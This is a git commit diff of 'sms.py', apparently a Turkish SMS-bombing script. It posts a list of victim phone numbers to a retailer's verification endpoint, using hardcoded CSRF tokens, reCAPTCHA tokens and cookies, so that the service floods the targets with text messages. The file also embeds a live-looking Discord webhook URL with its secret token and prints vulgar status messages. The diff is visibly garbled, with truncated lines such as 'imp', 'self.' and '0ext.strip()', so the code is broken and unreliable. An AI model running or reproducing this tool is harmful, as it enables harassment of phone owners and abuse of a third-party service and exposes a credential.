405190f0ca5623ee02bca1ca2c517d839a0a4b18
fourtel <125697683+fourtel@users.noreply.github.com>
2023-02-18 00:51:20 +0300

    Update sms.py

--- sms.py
+++ sms.py
@@ -1,19 +1,5 @@
 import requests
-import datetime
-import os
-import threading
-from random import choice
-from string import ascii_lowercase
-from bs4 import BeautifulSoup
-from colorama import Fore, Style
-from time import sleep
-from colorama import Fore, Style
-from time import sleep
-from os import system
-from requests import get
-import urllib3
-import time
-
+imp
 # Webhook URL'sini tanımla
 webhook_url = "https://discord.com/api/webhooks/1075501854429028383/Lfrt5HUjxuytbYiuxMHSlqymHgBFDl5CKuMqo4amVDmlg2BzEzBbnt5OI27lQxqBNvlS"
 
@@ -32,42 +18,12 @@ class SendSms():
    
     def __init__(self, phone, phone2, phone3, phone4, phone5, mail):
         self.phone = str(phone)
-        self.phone2 = str(phone2)
-        self.phone3 = str(phone3)
-        self.phone4 = str(phone4)
-        self.phone5 = str(phone5)
-        if len(mail) != 0:
-            self.mail = mail
-        else:
-            self.mail = ''.join(choice(ascii_lowercase) for i in range(19))+"@gmail.com"
-            
-    
-    
-
-
+        self.
     # dsmartgo.com.tr
     def Dsmartgo(self):
         liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
         bos_olmayan = len([x for x in liste if x != "bos"])
-        uygulanan_nolar = 0
-        for numara in liste:
-            if numara != "bos":
-                    dsmartgo = requests.post("https://www.dsmartgo.com.tr/web/account/checkphonenumber", data={
-        	        "__RequestVerificationToken": "bYFLKS9DehCBAb7l7KaI2WoTdtAJZya-AWsDTmHCl9FnEaUZiF2F1l3XkwppUyT0I3bXMUdUAruBUcqR8jVuLVsxPC41",
-        	        "IsSubscriber": "true",
-        	        "__reCAPTCHAVerificationToken": "03AGdBq26zV1jYt3RM1kdow0gpFcD7veljQAdV-0QoKLQIWi3voe27TlOwjbktguXtHgngHy13jsTzudfoNuLowIdqG1RcX4_XP5VoXy4un214kmTqChIDJPMKWvkUmLfXvWvXNTdajueI0T4zkdX2VGLz1Vn-uQxRRWxXjY81GZQlLUqu3oOSDYLBN2JH5DPh79Ms4BAxrTFC-ywWIWN1VVN5R2S6R6Ew7iyhDN_QQ1Ow5XcKuT7ycZbMrC_GUML5sKeDgoOtvm4pZ75LKX8ZArd9EPM783h0AXXVMedFGxa0V7a6_FocQ_7PRHeyOnku-HyoMgGZgB7cSIu6tPNddtYGLbOMGhR-2EyCtW4qKq1a9yceT-v7nequ9S0Cr-gYhb7DkjUyk56oUaZD6Za2NzqxIHPzfWC2M9x8WWeiWFqGSCHhjtL29UzGV8HH38X85BEpJKUVc_1U",
-        	        "Mobile": numara,
-                }, cookies={
-        		    "__RequestVerificationToken": "zavKdfCRqVPRUTX-52rcfG8yfGNVfs10gNOb5RIn16upRTctGH4nBp8ReSMxzZUN4cJQTcvY0b4uzP6AL0inDD_cFyA1",
-        		    "_ga": "GA1.3.1016548678.1638216163",
-        		    "_gat": "1",
-        		    "_gat_gtag_UA_18913632_14": "1",
-        		    "_gid": "GA1.3.1214889554.1638216163",
-        		    "ai_session": "lsdsMzMdX841eBwaKMxd8e|1638216163472|1638216163472",
-        		    "ai_user": "U+ClfGV5d2ZK1W1o19UNDn|2021-11-29T20:02:43.148Z"
-        	    })
-            try:
-                BeautifulSoup(dsmartgo.text, "html.parser").find("div", {"class": "info-text"}).text.strip()
+        uygulanan_nolar = 0ext.strip()
                 print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}affet kanka sikemedim! --> dsmartgo.com.tr")
             except AttributeError:
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}ibo yeter sikme! --> dsmartgo.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
